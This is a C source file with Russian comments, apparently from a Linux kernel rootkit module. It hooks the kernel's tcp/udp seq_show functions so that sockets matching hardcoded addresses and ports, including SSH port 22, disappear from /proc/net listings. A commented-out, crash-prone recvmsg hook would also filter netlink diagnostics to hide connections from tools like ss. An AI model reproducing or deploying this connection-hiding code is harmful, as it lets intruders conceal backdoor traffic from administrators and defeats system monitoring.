#include <asm-generic/access_ok.h>

extern int debug_lvl;

// падает ядро (против tcpdump)
// static asmlinkage long ex_sys_recvfrom(struct pt_regs *regs) {
//     long ret = real_sys_recvmsg(regs);
//     udelay(300);
//     return ret;

// }


// Функция для систем, поддерживающих pt_regs
// int fd
// struct user_msghdr __user *msg,
// unsigned int flags

// надо подумать. ошибка. вроде в этой функции
// [56902.858669] BUG: unable to handle page fault for address: ffffffffc0cec186
// [56902.858727] #PF: supervisor instruction fetch in kernel mode
// [56902.858731] #PF: error_code(0x0010) - not-present page

// static asmlinkage long ex_sys_recvmsg(struct pt_regs *regs) {
//     long ret = real_sys_recvmsg(regs);

//     // это плохо сделано, но nlh->nlmsg_len выдает немыслеммые значения 
//     // крч надо подумать над этим, а пока будет сделано жестко 
//     if (ret <= 0 /*|| ret % 116 != 0*/) {
//         goto out;
//     }

// ------------------------- get iov_base -------------------------------
    // struct user_msghdr __user *umsg = (struct user_msghdr __user *)regs->si;
    // struct iovec __user *umsg_iov;
    // void __user *uiov_base;

    // __kernel_size_t	msg_iovlen;

    // char *buffer;

    // if (get_user(msg_iovlen, &umsg->msg_iovlen)) {
    //     if (debug_lvl) {
    //         pr_err("Failed to get msg_iovlen\n");
    //     }
    //     goto out;
    // }

    // if (msg_iovlen > 1 || get_user(umsg_iov, &umsg->msg_iov)) {
    //     if (debug_lvl) {
    //         pr_err("Failed to get msg_iov\n");
    //     }
    //     goto out;
    // }

    // if (get_user(uiov_base, &umsg_iov->iov_base)) {
    //     if (debug_lvl) {
    //         pr_err("Failed to get iov_base\n");
    //     }
    //     goto out;
    // }
    
    // if (!uiov_base) {
    //     goto out;
    // }
        
    // buffer = kzalloc(ret, GFP_KERNEL);
    // if (buffer == NULL) {
    //     if (debug_lvl) {
    //         pr_err("Failed to kzalloc buffer\n");
    //     }
    //     goto out;
    // }

    // if (copy_from_user(buffer, uiov_base, ret)) {
    //     if (debug_lvl) {
    //         pr_err("Failed to copy_from_user iov_base\n");
    //     }
    //     goto out;
    // }
// ----------------------------------------------------------------------

// ------------------------- read buffer --------------------------------
// struct nlmsghdr          netlink.h
// struct inet_diag_msg     inet_diag.h

//     int offset = 0;
//     __u32 nlmsg_len;
//     struct nlmsghdr *nlh = (struct nlmsghdr *) buffer;
//     long real_ret = ret;

//     // Ищем и удаляем запись
//     while (offset < ret) {
//         nlh = (struct nlmsghdr *)((char *)nlh + offset);
//         nlmsg_len = nlh->nlmsg_len;

//         // пока возьмем 116 как потолок. надо тут более здраво продумать
//         if (nlmsg_len > 116/*sizeof(struct nlmsghdr)*/) {
//             if (debug_lvl) {
//                 // pr_err("Invalid nlmsg_len: %u\n", nlmsg_len);
//             }

//             ret = real_ret;
//             goto out;
//         }

//         if (((struct nlmsghdr*)buffer)->nlmsg_type != SOCK_DIAG_BY_FAMILY) {
//             goto out;
//         }

//         struct inet_diag_msg *idm = (struct inet_diag_msg*) ((char *)buffer + sizeof(struct nlmsghdr));
        
//         if (
//             ((struct inet_diag_sockid)idm->id).idiag_sport == htons(68) || 
//             ((struct inet_diag_sockid)idm->id).idiag_dport == htons(443) 
//             ) {
//             if (debug_lvl) {
//                 pr_info("hola %d\n", ntohs(((struct inet_diag_sockid)idm->id).idiag_sport));
//             }    

//             memmove(nlh, (char *)nlh + nlmsg_len, (char *)buffer + ret - ((char *)nlh + nlmsg_len));
//             ret -= nlmsg_len;
//             memset((char *)buffer + ret, 0, nlmsg_len);

//             continue;
//         }

//         offset += nlmsg_len;
//     }

//     if (copy_to_user(uiov_base, buffer, ret)) {
//         if (debug_lvl) {
//             pr_err("Failed to copy_to_user buffer\n");
//         }
// 		goto out;
// 	}

//     if (!ret) {
//         ret = -EAGAIN;
//     }
// // ----------------------------------------------------------------------

// out:
//     if (buffer) {
//         kfree(buffer);
//     }
//     return ret;
// }



// -------------------- filter from /proc/net/* -------------------------
// ==================== Вспомогательные функции =========================

enum Protocols {
    tcp,
    udp
};

enum IP_type {
    ipv4,
    ipv6
};

/*
    !Подумать на типом хранения строк с ip
*/
char *tcp4_addrs[] = {"15.197.130.177", "0.0.0.0"};
char *udp4_addrs[] = {"192.168.157.254", "0.0.0.0"};
char *tcp6_addrs[] = {"::"};
char *udp6_addrs[] = {"2001:db8::1"};
struct Extended_array addrs[] = {
    {tcp4_addrs, sizeof(tcp4_addrs) / sizeof(tcp4_addrs[0])}, 
    {udp4_addrs, sizeof(udp4_addrs) / sizeof(udp4_addrs[0])},
    {tcp6_addrs, sizeof(tcp6_addrs) / sizeof(tcp6_addrs[0])}, 
    {udp6_addrs, sizeof(udp6_addrs) / sizeof(udp6_addrs[0])}
};

unsigned int tcp4_ports[] = {22};
unsigned int udp4_ports[] = {67};
unsigned int tcp6_ports[] = {222};
unsigned int udp6_ports[] = {1235};
struct Extended_array ports[] = {
    {tcp4_ports, sizeof(tcp4_ports) / sizeof(tcp4_ports[0])}, 
    {udp4_ports, sizeof(udp4_ports) / sizeof(udp4_ports[0])},
    {tcp6_ports, sizeof(tcp6_ports) / sizeof(tcp6_ports[0])}, 
    {udp6_ports, sizeof(udp6_ports) / sizeof(udp6_ports[0])}
};

bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol);
bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol);
bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type);
bool is_skip4_seq_show (void *v, enum Protocols protocol);
bool is_skip6_seq_show (void *v, enum Protocols protocol);


/*
    is_hide4_addr - функция, скрывать или нет ipv4 сокет по адресу источника или адресу назначения

    __be32 *saddr - указатель на адрес источника
    __be32 *daddr - указатель на адрес назначения
    enum Protocols protocol - протокол
*/
bool is_hide4_addr(__be32 *saddr, __be32 *daddr, enum Protocols protocol) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть
    __be32 addr;

    for (int ip_id = 0; ip_id < addrs[protocol].array_size; ip_id++) {
        if (!in4_pton(((char **)addrs[protocol].array_addr)[ip_id], -1, (u8 *)&addr, '\0', NULL)) {
            pr_err("Err in4_pton\n");
            continue;
        }

        if (*saddr == addr || *daddr == addr) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide6_addr - функция, скрывать или нет ipv6 сокет по адресу источника/назначения

    struct in6_addr *saddr - указатель на адрес источника
    struct in6_addr *daddr - указатель на адрес назначения
    enum Protocols protocol - протокол

    struct in6_addr - uapi/linux/in6.h
*/
bool is_hide6_addr(struct in6_addr *saddr, struct in6_addr *daddr, enum Protocols protocol) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть
    struct in6_addr addr;

    for (int ip_id = 0; ip_id < addrs[protocol + 2].array_size; ip_id++) {
        // +2 = расстояние от v4 до v6
        if (!in6_pton(((char **)addrs[protocol + 2].array_addr)[ip_id], -1, addr.s6_addr, '\0', NULL)) {
            pr_err("Err in6_pton\n");
            continue;
        }

        if (memcmp(saddr, &addr, sizeof(struct in6_addr)) == 0 || 
            memcmp(daddr, &addr, sizeof(struct in6_addr)) == 0) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_port - функция, скрывать или нет ipv4/6 сокет по порту источника/назначения

    __be16 sport - порт источника
    __be16 dport - порт назначения
    enum Protocols protocol - протокол
    enum IP_type ip_type - версия ip
*/
bool is_hide_port(__be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
    // надо будет потом добавить проверку на наличие данных в этом массиве
    // пока будем думать, что чтото в нем есть

    // 2 * ip_type - если ipv4, то 0. Иначе нужноее смщенеие 2
    for (int port_id = 0; port_id < ports[protocol + 2 * ip_type].array_size; port_id++) {
        if (sport == htons(((unsigned int *)ports[protocol + 2 * ip_type].array_addr)[port_id]) || 
            dport == htons(((unsigned int *)ports[protocol + 2 * ip_type].array_addr)[port_id])) {
            return true;
        }    
    }

    return false;
}

/*
    is_hide_net_info - функция, скрывать или нет сокет по адрес и порту источника/назначения

    void* saddr - указатель на адрес источника 
    void* daddr - указатель на адрес назначения
    __be16 sport - порт источника
    __be16 dport - порт назначения
    enum Protocols protocol - протокол
    enum IP_type ip_type - версия ip
*/
bool is_hide_net_info(void* saddr, void* daddr, __be16 sport, __be16 dport, enum Protocols protocol, enum IP_type ip_type) {
    // пока надо подумать над этим
    if ((ip_type == ipv4 && is_hide4_addr((__be32 *)saddr, (__be32 *)daddr, protocol)) ||
        (ip_type == ipv6 && is_hide6_addr((struct in6_addr*)saddr, (struct in6_addr*)daddr, protocol)) || 
        is_hide_port(sport, dport, protocol, ip_type)) {
        return true;
    }
    
    return false;
}

/*
    is_skip4_seq_show - функция, пропустить или нет ipv4 сокет

    void *v - указатель на данные
    enum Protocols protocol - протокол
    
    struct inet_sock - net/inet_sock.h
*/
bool is_skip4_seq_show (void *v, enum Protocols protocol) {
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = (struct sock *)v;
        struct inet_sock *is = inet_sk(sk);

        if (is_hide_net_info(&is->inet_saddr, &is->inet_daddr, is->inet_sport, is->inet_dport, protocol, ipv4)) {
            return true;
        }
    }

    return false;
}

/*
    is_skip6_seq_show - функция, пропустить или нет ipv6 сокет

    void *v - указатель на данные
    enum Protocols protocol - протокол
    
    linux/ipv6.h     - struct ipv6_pinfo
    uapi/linux/in6.h - struct in6_addr
*/
bool is_skip6_seq_show (void *v, enum Protocols protocol) {
    if (v != SEQ_START_TOKEN) {
        struct sock *sk = (struct sock *)v;
        struct inet_sock *is = inet_sk(sk);
        struct ipv6_pinfo *np = inet6_sk(sk);

        if (is_hide_net_info(&np->saddr, &sk->sk_v6_daddr, is->inet_sport, is->inet_dport, protocol, ipv6)) {
            return true;
        }
    }

    return false;
}
// ======================================================================


// ===================== Перехват функций ===============================

static asmlinkage long ex_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long res = real_tcp4_seq_show(seq, v);

    if (is_skip4_seq_show(v, tcp)) {
        return SEQ_SKIP;
    }

    return res;
}

static asmlinkage long ex_udp4_seq_show(struct seq_file *seq, void *v)
{
    long res = real_udp4_seq_show(seq, v);

    if (is_skip4_seq_show(v, udp)) {
        return SEQ_SKIP;
    }

    return res;
}

static asmlinkage long ex_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long res = real_tcp6_seq_show(seq, v);

    if (is_skip6_seq_show(v, tcp)) {
        return SEQ_SKIP;
    }
    return res;
}

static asmlinkage long ex_udp6_seq_show(struct seq_file *seq, void *v)
{
    long res = real_udp6_seq_show(seq, v);

    if (is_skip6_seq_show(v, udp)) {
        return SEQ_SKIP;
    }

    return res;
}

// ======================================================================
